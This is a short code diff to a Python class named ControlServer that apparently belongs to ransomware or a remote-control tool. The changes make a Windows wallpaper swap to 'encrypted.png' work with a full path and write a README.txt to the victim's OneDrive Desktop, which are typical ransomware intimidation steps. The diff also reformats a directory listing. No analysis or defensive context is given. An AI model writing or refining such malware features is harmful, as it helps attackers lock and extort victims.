@@ -32,11 +32,14 @@ class ControlServer:
                 entry_type = 'File'
             entries.append(f"{entry} - {entry_type}")
 
-        return ', '.join(entries)
+        return '\n'.join(entries)
 
     def change_wallpaper(self):
         if os.name == 'nt':
-            ctypes.windll.user32.SystemParametersInfoW(20, 0, 'encrypted.png', 0)
+            image_name = "encrypted.png"
+            current_directory = os.getcwd()
+            image_path = os.path.join(current_directory, image_name)
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 1)
         else:
             print("Wallpaper change feature is not supported on this OS.")
 
@@ -90,7 +93,7 @@ class ControlServer:
     def create_readme(self):
         home_path = os.path.expanduser("~")
         if os.name == 'nt':
-            home_path = os.environ['USERPROFILE']
+            home_path = os.path.join(os.environ['USERPROFILE'], 'OneDrive')
         desktop_path = os.path.join(os.path.join(home_path), 'Desktop')
         readme_path = os.path.join(desktop_path, 'README.txt')
         with open(readme_path, 'w') as file:
